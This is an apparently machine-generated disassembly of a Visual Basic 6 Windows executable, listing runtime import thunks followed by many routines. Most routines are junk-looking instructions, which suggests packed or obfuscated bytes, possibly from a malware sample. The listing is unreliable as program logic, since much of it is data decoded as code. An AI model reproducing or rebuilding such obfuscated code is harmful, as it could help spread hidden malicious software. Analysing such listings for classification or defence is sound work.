jmp [ _adj_fdiv_m64@IAT ]
_adj_fdiv_r
jmp [ _adj_fdiv_r@IAT ]
_adj_fdivr_m16i
jmp [ _adj_fdivr_m16i@IAT ]
_adj_fdivr_m32
jmp [ _adj_fdivr_m32@IAT ]
_adj_fdivr_m32i
jmp [ _adj_fdivr_m32i@IAT ]
_adj_fdivr_m64
jmp [ _adj_fdivr_m64@IAT ]
_adj_fpatan
jmp [ _adj_fpatan@IAT ]
_adj_fprem
jmp [ _adj_fprem@IAT ]
_adj_fprem1
jmp [ _adj_fprem1@IAT ]
_adj_fptan
jmp [ _adj_fptan@IAT ]
_CIatan
jmp [ _CIatan@IAT ]
_CIcos
jmp [ _CIcos@IAT ]
_CIexp
jmp [ _CIexp@IAT ]
_CIlog
jmp [ _CIlog@IAT ]
_CIsin
jmp [ _CIsin@IAT ]
_CIsqrt
jmp [ _CIsqrt@IAT ]
_CItan
jmp [ _CItan@IAT ]
_allmul
jmp [ _allmul@IAT ]
DllFunctionCall
jmp [ DllFunctionCall@IAT ]
Ordinal_MSVBVM60_685
jmp [ Ordinal_MSVBVM60_685@IAT ]
__vbaObjSet
jmp [ __vbaObjSet@IAT ]
__vbaI4Cy
jmp [ __vbaI4Cy@IAT ]
__vbaFpI4
jmp [ __vbaFpI4@IAT ]
Ordinal_MSVBVM60_527
jmp [ Ordinal_MSVBVM60_527@IAT ]
__vbaR8IntI4
jmp [ __vbaR8IntI4@IAT ]
__vbaCyMul
jmp [ __vbaCyMul@IAT ]
Ordinal_MSVBVM60_523
jmp [ Ordinal_MSVBVM60_523@IAT ]
Ordinal_MSVBVM60_589
jmp [ Ordinal_MSVBVM60_589@IAT ]
Ordinal_MSVBVM60_632
jmp [ Ordinal_MSVBVM60_632@IAT ]
Ordinal_MSVBVM60_546
jmp [ Ordinal_MSVBVM60_546@IAT ]
Ordinal_MSVBVM60_645
jmp [ Ordinal_MSVBVM60_645@IAT ]
Ordinal_MSVBVM60_612
jmp [ Ordinal_MSVBVM60_612@IAT ]
Ordinal_MSVBVM60_544
jmp [ Ordinal_MSVBVM60_544@IAT ]
__vbaI2Var
jmp [ __vbaI2Var@IAT ]
__vbaFreeObj
jmp [ __vbaFreeObj@IAT ]
__vbaLateIdCallLd
jmp [ __vbaLateIdCallLd@IAT ]
__vbaOnError
jmp [ __vbaOnError@IAT ]
__vbaLateMemCall
jmp [ __vbaLateMemCall@IAT ]
__vbaObjSetAddref
jmp [ __vbaObjSetAddref@IAT ]
__vbaPrintObj
jmp [ __vbaPrintObj@IAT ]
__vbaHresultCheckObj
jmp [ __vbaHresultCheckObj@IAT ]
__vbaNew2
jmp [ __vbaNew2@IAT ]
__vbaStrToUnicode
jmp [ __vbaStrToUnicode@IAT ]
__vbaSetSystemError
jmp [ __vbaSetSystemError@IAT ]
__vbaStrToAnsi
jmp [ __vbaStrToAnsi@IAT ]
__vbaI4Var
jmp [ __vbaI4Var@IAT ]
__vbaStrCopy
jmp [ __vbaStrCopy@IAT ]
__vbaFreeStrList
jmp [ __vbaFreeStrList@IAT ]
Ordinal_MSVBVM60_650
jmp [ Ordinal_MSVBVM60_650@IAT ]
__vbaStrCat
jmp [ __vbaStrCat@IAT ]
__vbaErrorOverflow
jmp [ __vbaErrorOverflow@IAT ]
__vbaFreeStr
jmp [ __vbaFreeStr@IAT ]
__vbaFreeVarList
jmp [ __vbaFreeVarList@IAT ]
Ordinal_MSVBVM60_526
jmp [ Ordinal_MSVBVM60_526@IAT ]
__vbaVarMul
jmp [ __vbaVarMul@IAT ]
__vbaVarTstNe
jmp [ __vbaVarTstNe@IAT ]
Ordinal_MSVBVM60_646
jmp [ Ordinal_MSVBVM60_646@IAT ]
__vbaLenBstrB
jmp [ __vbaLenBstrB@IAT ]
Ordinal_MSVBVM60_575
jmp [ Ordinal_MSVBVM60_575@IAT ]
Ordinal_MSVBVM60_698
jmp [ Ordinal_MSVBVM60_698@IAT ]
__vbaVarMove
jmp [ __vbaVarMove@IAT ]
Ordinal_MSVBVM60_618
jmp [ Ordinal_MSVBVM60_618@IAT ]
__vbaFreeVar
jmp [ __vbaFreeVar@IAT ]
Ordinal_MSVBVM60_520
jmp [ Ordinal_MSVBVM60_520@IAT ]
__vbaStrVarMove
jmp [ __vbaStrVarMove@IAT ]
__vbaStrMove
jmp [ __vbaStrMove@IAT ]
__vbaLsetFixstr
jmp [ __vbaLsetFixstr@IAT ]
__vbaFPFix
jmp [ __vbaFPFix@IAT ]
__vbaUI1I2
jmp [ __vbaUI1I2@IAT ]
__vbaLbound
jmp [ __vbaLbound@IAT ]
__vbaRefVarAry
jmp [ __vbaRefVarAry@IAT ]
__vbaUbound
jmp [ __vbaUbound@IAT ]
EVENT_SINK_QueryInterface
jmp [ EVENT_SINK_QueryInterface@IAT ]
EVENT_SINK_AddRef
jmp [ EVENT_SINK_AddRef@IAT ]
EVENT_SINK_Release
jmp [ EVENT_SINK_Release@IAT ]
Ordinal_MSVBVM60_100
jmp [ Ordinal_MSVBVM60_100@IAT ]
sub_4026df
jmp esp
sub_403574
mov eax [ rw-data ]
or eax eax
je r-xdata
push r-xdata
mov eax DllFunctionCall
call eax
jmp eax
jmp eax
sub_406ae5
adc ebx ecx
fcmovnbe st4
imul esp [ ecx ] 0x7f
or ebx [ edi + 0x1e46b200 ]
mov esi 0xfc12ad96
in al 0xec
mov ah 0x90
mov bl 0x85
int 0x4a
hlt
sub_40a918
sahf
pop ds
or edi [ edx ]
pop eax
cmc
test [ esi + esi * 8 + 0x314161d9 ] edx
idiv edx
mov al [ eax + 0x5a ]
sub [ edx + 0x1e ] edi
shl [ eax + eax * 4 + 0x22 ] 0x1
clc
int3
sub_40b377
push ss
inc ebp
int 0x5b
in al dx
cmp dl [ esi + 0x483c58f9 ]
movsb [ edi ] [ esi ]
rcl bl 0x1
0x99e3
sub_414718
retn
sub_414743
in al dx
in al 0xe
dec ecx
movsb [ edi ] [ esi ]
sbb [ eax ] edx
mov [ 0xffffffff9a371a2d ] al
fdivr st6

sub_425ed5
call [ edi ]
cmpsd [ esi ] [ edi ]
retn
sub_425f07
push es
jg r-xdata
and eax 0xddda6e9d
push esp
jmp 0xffffffffd9a82740
retn 0x8139
sub_42b2db
aad 0xdd
out 0xee al
test [ eax ] 0x26191108
xor eax [ ebx + 0x52 ]
arpl [ edi + 0x77 ] bp
or [ ecx - 0x535c656e ] 0xb4
add [ esi - 0x1e272f39 ] bh
0xd04fbf3 0x1e15
sub_42b498

sub_4384e0
inc [ ecx - 0x2a3f546a ]
0x402914ff 0x6e55
sub_439118
insb
xchg esp eax
xor esp [ edi - 0x70 ]
mov esp 0x70471aed
sahf

sub_43918a
int1
imul eax edx 0xfffffff1
pop ds
dec esp
jne r-xdata
mov al 0xdb
push ss
cmova esi [ ecx - 0x66 ]
int3
sub_43d6ba
0x35220ffc 0x5b48
sub_440ec6
jmp [ eax + 0x75 ]
sub_446553
jmp [ ecx + 0x77 ]
sub_44a9b2
adc eax 0x9e795735
retn 0x8e5
sub_44a9da
mov dl 0xd4
hlt
sub_44a9e2
in eax 0x4
dec edx
insd
nop
mov ch 0xda
jmp [ ecx ]
sub_44aa38
[ ecx ]
sub_44aa3a
dec ebp
jae r-xdata
dec edi
outsd
mov edi 0x4e2a07e5
jae r-xdata
aam 0xf4
push ss
cmp [ edx - 0x5d ] bl
retn
retn 0x27fa
sub_44ab12
sub cl [ esi + ebp * 2 - 0x6f ]
mov ch 0xda
std
and [ edi - 0x5e ] esp
0x1af2
sub_44c772
[ ecx - 0x80 ]
sub_44da1d
cmp edx [ eax + 0x63 ]
jbe r-xdata
mov bh 0xca
pushfd
scasd [ edi ]
retn 0xe8d5
sub_44f17b
jmp [ 0x7c66513c ]
sub_453aa6
or eax 0x87684a2b
movsd [ edi ] [ esi ]
retn
sub_45524e
jmp r-xdata
insb
sub_455c98
popfd
leave
hlt
sub_45ea84
mov dl 0xd5
sti
sbb eax 0xa8856341

sub_461318
0xeada
sub_461c29
mov bh 0xca
j_sub_461c29
jmp sub_461c29
sub_4669c3
[ esp + edi * 4 - 0x3142334 ]
sub_4677d2
0x301b0bfb 0x5040
sub_469797
test ebx 0xe9b7acfb
test dh 0xd3
push esi
test esi 0xe9b7be1b
test ch 0x67
xor edx [ esp ]
test cl 0x76
test cx 0xd8be
pop esi
cmp cl 0x1e
cmp al 0xe0
retn
sub_4697f8
into
0x2c1a
sub_46aa2f
daa
push esp
std

sub_46aa33
daa
push esp
std

sub_46aa37
daa
push esp
std

sub_46aa3b
daa
push esp
std

sub_46aa3f
daa
push esp
std

sub_46aa43
daa
push esp
std

sub_46aa47
daa
push esp
std

sub_46aa4b
daa
push esp
std

sub_46aa4f
daa
push esp
std

sub_46aa53
daa
push esp
std

sub_46aa57
daa
push esp
std

sub_46aa5b
daa
push esp
std

sub_46aa63
daa
push esp
std

sub_46aa67
daa
push esp
std

sub_46aa6b
daa
push esp
std

sub_46aa6f
daa
push esp
std

sub_46aa73
daa
push esp
std

sub_46aa77
daa
push esp
std

sub_46aa7b
daa
push esp
std

sub_46aa7f
daa
push esp
std

sub_46aa83
daa
push esp
std

sub_46aa87
daa
push esp
std

sub_46aa8b
daa
push esp
std

sub_46aa8f
daa
push esp
std

sub_46aa93
daa
push esp
std

sub_46aa97
daa
push esp
std

sub_46aa9b
daa
push esp
std

sub_46aa9f
daa
push esp
std

sub_46aaa3
daa
push esp
std

sub_46aaa7
daa
push esp
std

sub_46aaab
daa
push esp
std

sub_46aaaf
daa
push esp
std

sub_46aab3
daa
push esp
std

sub_46aab7
daa
push esp
std

sub_46aabb
daa
push esp
std

sub_46aabf
daa
push esp
std

sub_46aac3
daa
push esp
std

sub_46aac7
daa
push esp
std

sub_46aacb
daa
push esp
std

sub_46aacf
daa
push esp
std

sub_46aad3
daa
push esp
std

sub_46aad7
daa
push esp
std

sub_46aadb
daa
push esp
std

sub_46aadf
daa
push esp
std

sub_46aae3
daa
push esp
std

sub_46aae7
daa
push esp
std

sub_46aaeb
daa
push esp
std

sub_46aaef
daa
push esp
std

sub_46aaf3
daa
push esp
std

sub_46ac64
or esp [ eax - 0xbb30e6a ]
salc
dec esp
hlt
sub_46c78f
inc edx
0x1c63
sub_46c97b
stc
mul [ eax + 0x296f76e2 ]
mov [ 0xffffffff94618a69 ] al
stc

sub_46c989
mov [ 0x618a997d ] al
xchg esp eax
stc

sub_46cb18
shr [ ebx ] 0x1

sub_46ccdb
daa
push esp
std

sub_46ccdf
daa
push esp
std

sub_46cce3
daa
push esp
std

sub_46cce7
daa
push esp
std

sub_46cceb
daa
push esp
std

sub_46ccef
daa
push esp
std

sub_46ccf3
daa
push esp
std

sub_46ccf7
daa
push esp
std

sub_46ccfb
daa
push esp
std

sub_46ccff
daa
push esp
std

sub_46cd03
daa
push esp
std

sub_46cd0b
daa
push esp
std

sub_46cd0f
daa
push esp
std

sub_46cd13
daa
push esp
std

sub_46cd17
daa
push esp
std

sub_46cd1b
daa
push esp
std

sub_46cd1f
daa
push esp
std

sub_46cd23
daa
push esp
std

sub_46cd27
daa
push esp
std

sub_46cd2b
daa
push esp
std

sub_46cd2f
daa
push esp
std

sub_46cd33
daa
push esp
std

sub_46cd37
daa
push esp
std

sub_46cd3b
daa
push esp
std

sub_46cd3f
daa
push esp
std

sub_46cd43
daa
push esp
std

sub_46cd47
daa
push esp
std

sub_46cd4b
daa
push esp
std

sub_46cd4f
daa
push esp
std

sub_46cd53
daa
push esp
std

sub_46cd57
daa
push esp
std

sub_46cd5b
daa
push esp
std

sub_46cd5f
daa
push esp
std

sub_46cd63
daa
push esp
std

sub_46cd67
daa
push esp
std

sub_46cd6b
daa
push esp
std

sub_46cd6f
daa
push esp
std

sub_46cd73
daa
push esp
std

sub_46cd77
daa
push esp
std

sub_46cd7b
daa
push esp
std

sub_46cd7f
daa
push esp
std

sub_46cd83
daa
push esp
std

sub_46cd87
daa
push esp
std

sub_46cd8b
daa
push esp
std

sub_46cd8f
daa
push esp
std

sub_46cd93
daa
push esp
std

sub_46cd97
daa
push esp
std

sub_46cd9b
daa
push esp
std

sub_46cd9f
daa
push esp
std

sub_46cda3
daa
push esp
std

sub_46cda7
daa
push esp
std

sub_46cdab
daa
push esp
std

sub_46cdaf
daa
push esp
std

sub_46cdb3
daa
push esp
std

sub_46cdb7
daa
push esp
std

sub_46cdbb
daa
push esp
std

sub_46d71a
0xe17a
sub_46d73a
out dx eax
push esi
sub esp [ eax + 0x5fe7b17e ]
imul ebx [ eax + 0x25 ] 0x4e3fc482
inc ebp
and [ ebx ] ch
lodsd [ esi ]
pushfd
sub eax 0x12c5c87a
insb
int3
sub_4727b4
mov [ eax ] es
[ ebp - 0x4a00ff5b ]
sub_472ee5
[ eax ]
sub_47305c
mov [ eax ] es
[ ebp - 0x4a00ff5b ]
sub_473879
sar [ edx - 0x64a4506 ] 0xa8
cmpsb [ esi ] [ edi ]
hlt
sub_47393b
fcomp [ ebp - 0x39310c67 ]
or edx ecx
enter 0xcbf8 0xc3
clc
mov eax 0xf8c0c7f8
mov ecx 0xf8c3caf8

sub_47395c
not eax
enter 0xd1f7 0xc9
not edx
0xd3f7
sub_473967

sub_473968
not ebp
int 0xf6
salc
into
neg al
iretd
sub_473971
neg al
iretd
sub_473974
neg al
into
cmc
aam 0xcb

sub_47397c
retn
sub_47397d
0x88deabb0 0xd486
sub_473984
outsd
outsd
int3
sub_4739bd
retn 0xf9bd
sub_4739c0
sar [ ebx - 0x6423d07 ] 0xc3
mov esi 0xf9bfc5f9
mov al 0xf8
mov ecx 0xf8c3c9f8
0xf852
sub_4739d8

sub_4739da
clc
int 0xc5
test esi 0xc8d0f7c6
not ecx
leave
not edx
0xd3f7
sub_4739eb

sub_4739ec
not ch
int3
sub_47458c
retn 0x577f
sub_47458f
0x6b8f
sub_47474f
inc [ eax + 0xff3f ]
add bh bh
clc
add [ edi ] al
inc [ eax ]
add [ eax ] al
push eax
add [ ecx ] al
inc [ eax ]
add [ eax ] al
jmp eax
sub_474b54
ror dl cl
clc
int3
sub_474bce
clc
int3
sub_474c3a
clc
int3
sub_47551d
[ eax ]
sub_47561e
clc
iretd
sub_475764
pop ebp
jmp r-xdata
jae r-xdata
movsb [ edi ] [ esi ]
pop ebp
jmp r-xdata
inc ebp
shl [ eax + 0x70 ] cl
sub_4757a0
push ecx
int3
sub_476a3c
lea edx [ ebp - 0xb0 ]
lea eax [ ebp - 0xa0 ]
push edx
push eax
push 0x2
call [ __vbaFreeVarList@IAT ]
add esp 0xc
retn
sub_476aac
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x6c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_476c8c
mov ecx [ ebp - 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_4799a6
lea ecx [ ebp - 0xe4 ]
call [ __vbaFreeStr@IAT ]
lea ecx [ ebp - 0xe8 ]
call [ __vbaFreeObj@IAT ]
lea eax [ ebp - 0x108 ]
push eax
lea ecx [ ebp - 0xf8 ]
push ecx
push 0x2
call [ __vbaFreeVarList@IAT ]
add esp 0xc
retn
sub_479ac0
mov ecx [ ebp - 0x20 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
